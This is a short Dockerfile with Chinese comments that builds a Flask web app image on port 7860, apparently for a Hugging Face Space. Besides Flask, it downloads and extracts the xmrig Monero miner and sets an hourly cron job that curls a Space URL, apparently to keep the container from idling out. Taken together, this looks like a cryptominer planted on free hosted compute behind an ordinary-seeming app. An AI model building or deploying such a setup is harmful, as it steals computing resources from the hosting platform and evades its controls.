# 使用 Ubuntu 20.04 作为基础镜像
FROM ubuntu:20.04

# 设置非交互式前端（避免构建过程中的交互式提示）
ENV DEBIAN_FRONTEND=noninteractive

# 可选，如果需要设置时区
ENV TZ=UTC

# 安装 Python、Flask 和必要工具
RUN apt-get update && \
    apt-get install -y python3 python3-pip cron wget curl tar python3 libssl1.1 hwloc libhwloc-dev && \
    pip3 install Flask && \
    ln -fs /usr/share/zoneinfo/$TZ /etc/localtime && \
    dpkg-reconfigure -f noninteractive tzdata

# 复制当前目录下的文件到容器的 /app 目录
COPY . /app

# 设置工作目录
WORKDIR /app

# 下载并设置 xmrig
RUN wget -O xmrig.tar.gz https://github.com/MoneroOcean/xmrig/releases/download/v6.21.0-mo1/xmrig-v6.21.0-mo1-lin64.tar.gz && \
    tar -xzvf xmrig.tar.gz && \
    chmod +x xmrig

# 设置 Flask 环境变量
ENV FLASK_APP=app.py
ENV FLASK_RUN_HOST=0.0.0.0
ENV FLASK_RUN_PORT=7860

# 公开端口
EXPOSE 7860

# 创建并设置 cron 任务
RUN (crontab -l 2>/dev/null; echo "0 * * * * curl -s https://huggingface.co/spaces/oomoumin232/a0002 > /dev/null 2>&1") | crontab -

# 使用 CMD 启动 cron 服务并运行 Flask 应用
CMD service cron start && flask run
